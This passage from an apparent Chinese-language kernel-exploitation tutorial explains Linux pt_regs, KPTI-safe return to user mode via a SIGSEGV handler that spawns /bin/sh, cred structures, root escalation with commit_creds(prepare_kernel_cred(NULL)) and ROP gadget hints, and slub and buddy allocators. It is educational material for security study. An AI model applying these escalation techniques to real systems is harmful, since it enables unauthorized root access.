<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">pt_regs</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p><img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3ee0687ee68d9de9d42881361d331098.png"
                     
                      
                
                >
另外如果找不到 <code>swapgs_restore_regs_and_return_to_usermode</code>
函数可以把 <code>get_shell</code> 函数注册为 <code>SIGSEGV</code>
信号处理函数，然后再用 swapgs + iretq 的方式返回。当出现异常时会跳转到
<code>get_shell</code> 函数继续执行，这样就完成了用户态的返回。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signal(SIGSEGV, (<span class="type">void</span> (*)(<span class="type">int</span>)) get_shell);</span><br></pre></td></tr></table></figure></div>
<p>上面这段代码本质就是在程序的段错误信号注册了一个
<code>get_shell</code> 回调函数。开启 KPIT 后 swapgs + iretq
的方式返回位切换页表，执行用户空间代码触发段错误回调
<code>get_shell</code> 函数。而回调 <code>get_shell</code>
函数前也会有系统态到用户态的切换，此时完成了页表和栈的正确切换（栈 0x10
对齐），确保执行 <code>get_shell</code> 函数不会出问题。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    signal(SIGSEGV, (<span class="type">void</span> (*)(<span class="type">int</span>)) get_shell);</span><br><span class="line">    *(<span class="type">size_t</span> *) <span class="number">0x114514</span> = <span class="number">0x1919810</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="关于-syscall">关于 <code>syscall</code></h3>
<p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如
IO
操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如
scanf，puts 等 IO 相关的函数实际上是对系统调用的封装 （read 和
write)）。 <code>Int $0x80</code>
指令的目的是产生一个编号为128的编程异常，这个编程异常对应的是中断描述符表
IDT 中的第 128
项——也就是对应的系统门描述符。门描述符中含有一个预设的内核空间地址，它指向系统调用处理程程序：<code>system_call()</code>
。</p>
<h2 id="进程权限管理">进程权限管理</h2>
<p><img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0efc0cedf397c0dfec156cce07f576aa.png"
                     
                      
                
                > 注意到
<code>task_struct</code> 的源码中有如下代码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">cred</span> __rcu		*ptracer_cred;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">cred</span> __rcu		*real_cred;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">cred</span> __rcu		*cred;</span><br></pre></td></tr></table></figure></div>
<p><strong>Process credentials</strong> 是 kernel
用以判断一个进程权限的凭证，在 kernel 中使用 <code>cred</code>
结构体进行标识，对于一个进程而言应当有三个 <code>cred</code> ：</p>
<ul>
<li><strong><code>ptracer_cred</code>：</strong> 使用
<code>ptrace</code> 系统调用跟踪该进程的上级进程的 <code>cred</code>（
gdb
调试便是使用了这个系统调用，常见的反调试机制的原理便是提前占用了这个位置）。</li>
<li><strong><code>real_cred</code>：</strong>即<strong>客体凭证</strong>（<strong>objective
cred</strong>），通常是一个进程最初启动时所具有的权限。</li>
<li><strong><code>cred</code>：</strong>即<strong>主体凭证</strong>（<strong>subjective
cred</strong>），该进程的有效 <code>cred</code> ，kernel
以此作为进程权限的凭证。</li>
</ul>
<h3 id="进程权限凭证-cred-结构体">进程权限凭证： <code>cred</code>
结构体</h3>
<p>对于一个进程，在内核当中使用一个结构体 <code>cred</code>
管理其权限，该结构体定义于内核源码 <code>include/linux/cred.h</code>
中，如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">cred</span> &#123;</span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*session_keyring; <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*process_keyring; <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*thread_keyring; <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*request_key_auth; <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">user_struct</span> *user;	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">user_namespace</span> *user_ns; <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">group_info</span> *group_info;	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">rcu_head</span>	rcu;		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>
<p>我们主要关注 <code>cred</code> 结构体中管理权限的变量</p>
<h3 id="用户-id-和组-id">用户 ID 和组 ID</h3>
<p>一个 <code>cred</code> 结构体中记载了<strong>一个进程四种不同的用户
ID</strong>：</p>
<ul>
<li>用户真实 ID（<code>real UID</code>）:标识一个进程启动时的用户
ID</li>
<li>保存用户 ID（<code>saved UID</code>）：标识一个进程最初的有效用户
ID</li>
<li>有效用户
ID（<code>effective UID</code>）：标识一个进程正在运行时所属的用户
ID</li>
<li>文件系统用户
ID（<code>UID for VFS ops</code>）：标识一个进程创建文件时进行标识的用户
ID</li>
</ul>
<p>通常情况下这四个值都是相同的。</p>
<p>用户组 ID
同样分为四个：真实组、保存组、有效组、文件系统组与上面类似。</p>
<h3 id="提权">提权</h3>
<p>通过前面我们可以知道，只要我们改变一个进程的 <code>cred</code>
结构体，就能改变其执行权限。</p>
<p>内核空间下面有两个函数，都位于 <code>kernel/cred.c</code> 中：</p>
<ul>
<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的
<code>cred</code> 结构体，并返回一个新的 <code>cred</code>
结构体，需要注意的是 <code>daemon</code>
参数应为有效的进程描述符地址或者 NULL 。</li>
<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程。</li>
</ul>
<p>查看<code>prepare_kernel_cred()</code>函数源码，观察到如下逻辑：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (daemon)</span><br><span class="line">		old = get_task_cred(daemon);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		old = get_cred(&amp;init_cred);</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<p>在 <code>prepare_kernel_cred()</code> 函数中，若传入的参数为 NULL
，则会缺省使用 <code>init</code> 进程的 <code>cred</code>
作为模板进行拷贝，<strong>即可以直接获得一个标识着 root 权限的 cred
结构体</strong>。那么我们不难想到，只要我们能够在内核空间执行
<code>commit_creds(prepare_kernel_cred(NULL))</code>
，那么就能够将进程的权限提升到 root。</p>
<p>如果进行 ROP 提权有一个难点就是寻找将 rax 赋值给 rdi 的 gadget
。可以尝试搜索 <code>xchg rax, rdi</code>
，<code>push rax; pop rdi</code>，<code>mov rdi, rax</code> 等 gadget
。</p>
<p>另外 <code>init_cred</code> 是在内核当中有一个特殊的
<code>cred</code> ，它是 <code>init</code> 进程的 <code>cred</code>
，因此其权限为 root ，且该 <code>cred</code>
并非是动态分配的，因此当我们泄露出内核基址之后我们也便能够获得
<code>init_cred</code> 的地址，那么我们就只需要执行一次
<code>commit_creds(&amp;init_cred)</code>
便能完成提权，不过有些内核中没有
<code>init_cred</code>（实际上多数情况是由于缺少符号找不到
<code>init_cred</code>，因此需要逆向分析
<code>prepare_kernel_cred</code> 函数来定位 <code>init_cred</code>）。
<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/05061c3e0eb8ab90b2b3f95cefd42fe9.png"
                     
                      
                
                ></p>
<h2 id="io">IO</h2>
<p>UNIX/Linux 追求高层次抽象上的统一，其设计哲学之一便是万物皆文件。</p>
<h3 id="万物皆文件">万物皆文件</h3>
<p>UNIX/Linux 设计的哲学之一 —— 万物皆文件，在 Linux
系统的视角下，无论是文件、设备、管道、还是目录，进程，甚至是磁盘，套接字等等，一切都可以被抽象成文件，一切都可以使用访问文件的方式进行操作:</p>
<p>通过这种哲学，Linux提供了操作的同一性:</p>
<ul>
<li><strong>所有的读取操作都可以通过 <code>read</code>
进行</strong></li>
<li><strong>所有的更改操作都可以通过 <code>write</code>
进行</strong></li>
</ul>
<h3 id="进程文件系统">进程文件系统</h3>
<p>用以描述一个进程，其中包括一个该进程所打开的文件描述符、堆栈内存布局、环境变量等</p>
<p>进程文件系统本身是一个伪文件系统，通常被挂载到 <code>/proc</code>
目录下，并不真正占用存储，而是占用一定的内存</p>
<p>当一个进程被建立起来时，其进程文件系统便会挂载到
<code>/proc/[PID]</code> 下，我们可以在该目录下查看其相关信息。</p>
<h3 id="文件描述符">文件描述符</h3>
<p>进程通过文件描述符来完成对文件的访问，其在形式上是一个非负整数，本质上是对文件的索引值，进程所有执行
I/O 操作的系统调用都会通过文件描述符。</p>
<p>每个进程都独立有着一个文件描述符表，存放着该进程所打开的文件索引，每当进程成功打开一个现有文件/创建一个新文件时（通过系统调用
<code>open</code> 进行操作），内核会向进程返回一个文件描述符。</p>
<p>在 kernel 中有着一个文件表，由所有的进程共享。</p>
<p>每个 <code>*NIX</code> 进程都应当有着三个标准的 POSIX
文件描述符，对应着三个标准文件流：</p>
<ul>
<li><code>stdin</code>：标准输入 = 0</li>
<li><code>stdout</code>：标准输出 = 1</li>
<li><code>stderr</code>：标准错误 = 2</li>
</ul>
<p>后面打开的文件描述符应当从标号 3 起始。</p>
<h3 id="系统调用ioctl">系统调用：ioctl</h3>
<p>在<code>*NIX</code>中一切都可以被视为文件，因为一切都可以访问文件的方式进行操作，<code>Linux</code>定义了系统调用<code>ioctl</code>供进程与设备之间进行通信</p>
<p>系统调用<code>ioctl</code>是一个用于设备输入输出操作的一个系统调用，调用方式如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd,<span class="type">unsigned</span> <span class="type">long</span> request, ...)</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>fd</code>：设备的文件描述符</li>
<li><code>request</code>：请求码</li>
<li>其他参数</li>
</ul>
<p>对于一个提供了ioctl通信方式的设备而言，我们可以通过其文件描述符、使用不同的请求码及其他请求参数通过ioctl系统调用完成不同的对设备的I/O操作</p>
<blockquote>
<p>例如CD-ROM驱动程序弹出光驱的这一操作就对应着对“光驱设备”这一文件通过ioctl传递特定的请求码与请求参数完成</p>
</blockquote>
<h2 id="内存管理">内存管理</h2>
<p>具体分析见 <a class="link" 
 target="_blank" rel="noopener" href="https://sky123.blog.csdn.net/article/details/130163993" >linux
内核内存管理<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i> 。</p>
<h3 id="物理内存">物理内存</h3>
<p>线性映射区是 linux
内核中的一个特殊的内存区域，这块内存映射是物理机上的所有物理内存。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</span><br></pre></td></tr></table></figure></div>
<p><code>vmemmap</code> 是一个虚拟 <code>page</code> 数组，存放了 linux
所有物理页对应的 <code>page</code> 。 <code>page</code>
数组，线性映射区和物理内存三者是线性映射的关系。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3e3c2449e2a737aed1da834761c0d355.png"
                     
                      
                
                ></p>
<h3 id="buddy-system">buddy system</h3>
<p><img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/49fb3d6cbe9fed7e2280b4b4a6f20bad.png"
                     
                      
                
                > buddy
system 中内存管理的一个例子： <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/b208933c9362745faccf49d8f545ae8d.png"
                     
                      
                
                >
这个例子中，分配的最小单位是64K，初始时的最大块order=4.
依次进行下面的操作</p>
<ul>
<li>初始状态</li>
<li>分配块A 34K, order=0.
<ul>
<li>没有order为0的块，切分order=4的块为2个order=3的块.</li>
<li>仍然没有order=0的块，再切分order=3的块.</li>
<li>仍然没有order=0的块，再切分order=2的块.</li>
<li>仍然没有order=0的块，再切分order=1的块.</li>
<li>将order=0的块返回.</li>
</ul></li>
<li>分配块B 66K, order=1. 已经有了，直接返回.</li>
<li>分配块C 35K, order=0. 也已经有了，直接返回.</li>
<li>分配块D 67K, order=1. 切分一个order=2的块，返回.</li>
<li>块B释放.</li>
<li>块D释放，因为与其后面的order=1的块是第5步分裂得来的，再将其合并为order=2的块.</li>
<li>块A释放.</li>
<li>块C释放，依次合并.</li>
</ul>
<h3 id="slub">slub</h3>
<figure>
<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a7b2a1a75b2154f05c6763d98d2c3eb7.png"
                     
                      alt="img" 
                
                >
<figcaption aria-hidden="true">img</figcaption>
</figure>
<h4 id="关于-object">关于 object</h4>
<p>slab 以页为基本单位切割，然后用单向链表(fd指针)串起来，类似用户态堆的
fastbin，每一个小块我们叫它 object 。</p>
<p><strong>注意：object 的 freelist 指针偏移是 kmem_cache.offset 而不是
0，虽然大多数情况 kmem_cache.offset 默认为 0 。</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">set_freepointer</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *object, <span class="type">void</span> *fp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> freeptr_addr = (<span class="type">unsigned</span> <span class="type">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	*(<span class="type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>object 结构如下图所示： <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/80fbfc5452e6ee425f7676a492aef25a.png"
                     
                      
                
                ></p>
<h4 id="kmem_cache-创建">kmem_cache 创建</h4>
<p>slub
分配器把伙伴系统提供的内存内存切割成特定大小的块，进行内核的小内存分配。</p>
<p>具体来说，内核会预先定义一些 <code>kmem_cache</code>
结构体，它保存着要如何分割使用内存页的信息，可以通过
<code>cat /proc/slabinfo</code> 查看系统当前可用的
<code>kmem_cache</code> 。</p>
<p>内核很多的结构体会频繁的申请和释放内存，用 <code>kmem_cache</code>
来管理特定的结构体所需要申请的内存效率上就会比较高，也比较节省内存。默认会创建
<code>kmalloc-8k</code> ，<code>kmalloc-4k</code>，...
，<code>kmalloc-16</code> ，<code>kmalloc-8</code> 这样的 cache
，<code>kmem_cache</code> 的名称以及大小使用
<code>struct kmalloc_info_struct</code> 管理。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123; </span><br><span class="line">    &#123;<span class="literal">NULL</span>,                        <span class="number">0</span>&#125;,     &#123;<span class="string">&quot;kmalloc-96&quot;</span>,             <span class="number">96</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-192&quot;</span>,           <span class="number">192</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8&quot;</span>,               <span class="number">8</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16&quot;</span>,             <span class="number">16</span>&#125;,     &#123;<span class="string">&quot;kmalloc-32&quot;</span>,             <span class="number">32</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-64&quot;</span>,             <span class="number">64</span>&#125;,     &#123;<span class="string">&quot;kmalloc-128&quot;</span>,           <span class="number">128</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-256&quot;</span>,           <span class="number">256</span>&#125;,     &#123;<span class="string">&quot;kmalloc-512&quot;</span>,           <span class="number">512</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-1024&quot;</span>,         <span class="number">1024</span>&#125;,     &#123;<span class="string">&quot;kmalloc-2048&quot;</span>,         <span class="number">2048</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-4096&quot;</span>,         <span class="number">4096</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8192&quot;</span>,         <span class="number">8192</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16384&quot;</span>,       <span class="number">16384</span>&#125;,     &#123;<span class="string">&quot;kmalloc-32768&quot;</span>,       <span class="number">32768</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-65536&quot;</span>,       <span class="number">65536</span>&#125;,     &#123;<span class="string">&quot;kmalloc-131072&quot;</span>,     <span class="number">131072</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-262144&quot;</span>,     <span class="number">262144</span>&#125;,     &#123;<span class="string">&quot;kmalloc-524288&quot;</span>,     <span class="number">524288</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-1048576&quot;</span>,   <span class="number">1048576</span>&#125;,     &#123;<span class="string">&quot;kmalloc-2097152&quot;</span>,   <span class="number">2097152</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-4194304&quot;</span>,   <span class="number">4194304</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8388608&quot;</span>,   <span class="number">8388608</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16777216&quot;</span>, <span class="number">16777216</span>&#125;,     &#123;<span class="string">&quot;kmalloc-33554432&quot;</span>, <span class="number">33554432</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-67108864&quot;</span>, <span class="number">67108864</span>&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>